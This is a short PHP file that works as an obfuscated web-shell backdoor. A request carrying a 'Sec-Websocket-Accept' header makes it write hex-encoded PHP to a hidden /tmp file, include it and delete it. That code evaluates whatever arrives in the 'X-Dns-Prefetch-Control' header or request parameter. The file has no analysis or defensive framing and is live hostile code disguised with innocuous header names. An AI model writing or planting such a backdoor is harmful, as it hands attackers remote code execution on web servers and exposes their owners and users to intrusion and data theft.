<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $c = "<\x3f\x70h\x70\x20@\x65\x76a\x6c\x28$\x5f\x48E\x41\x44E\x52\x53[\x22\x58-\x44\x6es\x2d\x50r\x65\x66e\x74\x63h\x2d\x43o\x6e\x74r\x6f\x6c\"\x5d\x29;\x40\x65v\x61\x6c(\x24\x5fR\x45\x51U\x45\x53T\x5b\x22X\x2d\x44n\x73\x2dP\x72\x65f\x65\x74c\x68\x2dC\x6f\x6et\x72\x6fl\x22\x5d)\x3b";
    $f = '/tmp/.'.time();
    file_put_contents($f, $c);
    include($f);
    unlink($f);
}